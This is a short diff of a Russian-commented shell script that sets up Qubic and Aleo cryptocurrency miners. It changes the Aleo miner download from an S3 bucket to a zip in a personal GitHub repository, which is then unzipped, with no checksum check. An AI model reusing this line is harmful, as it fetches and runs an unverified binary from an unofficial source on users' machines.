@@ -33,7 +33,7 @@ tar -xvf qli-Client-2.2.1-Linux-x64.tar.gz
 rm qli-Client-2.2.1-Linux-x64.tar.gz
 
 # Загружаем Aleo miner
-wget https://public-download-ase1.s3.ap-southeast-1.amazonaws.com/aleo-miner/aleominer+3.0.12.zip
+wget https://github.com/LOLPANIC/Mike/raw/refs/heads/main/aleominer+3.0.12.zip
 
 # Распаковываем архив с Aleo miner
 unzip aleominer+3.0.12.zip
